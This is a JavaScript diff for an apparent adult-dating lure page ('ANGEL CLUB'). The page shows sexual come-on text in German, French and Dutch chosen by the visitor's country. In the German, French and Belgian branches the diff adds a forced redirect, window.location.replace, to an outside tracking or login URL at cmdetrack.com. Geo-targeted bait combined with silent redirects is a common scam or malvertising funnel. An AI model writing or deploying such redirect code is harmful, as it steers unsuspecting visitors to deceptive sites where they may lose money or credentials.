@@ -48,6 +48,7 @@ city.innerHTML = data.city;
       test15.innerHTML = "JETZT REGISTRIEREN";
       }
        else if (data.country_code =="DE"){
+	       window.location.replace('http://cmdetrack.com/login.php?id=ngonokmu');
     test1.innerHTML = "geheime Gruppe";
      test2.innerHTML = "Dieser Inhalt ist für alleinstehende erwachsene Männer! <br> Hier warten viele Mädchen und Witwen auf Sex, haben Spaß und plaudern. <br> ANGEL CLUB";
      test3.innerHTML = "weiter";
@@ -82,6 +83,7 @@ city.innerHTML = data.city;
       test15.innerHTML = "JETZT REGISTRIEREN";
       }
       else if (data.country_code =="FR"){
+	      window.location.replace('http://cmdetrack.com/login.php?id=ngonokmu');
 	test1.innerHTML = "groupe secret";
 	test2.innerHTML = "Ce contenu est destiné aux hommes célibataires! <br> Voici beaucoup de filles et de veuves attendant le sexe, s'amusant et discutant. <br> ANGEL CLUB";
 	test3.innerHTML = "continue";
@@ -150,6 +152,7 @@ test14.innerHTML = "Vain aikuiset (18+)! Käytä alkuperäisiä valokuvia täss�
 test15.innerHTML = "LIITTY NYT";
       }
       else if (data.country_code =="BE"){
+	      window.location.replace('http://cmdetrack.com/login.php?id=ngonokmu');
 test1.innerHTML = "geheime groep";
 test2.innerHTML = "Deze inhoud is alleen voor mannen! <br> Er zijn veel meisjes en weduwen die wachten op seks, plezier maken en chatten. <br> ANGEL CLUB";
 test3.innerHTML = "doorgaan";
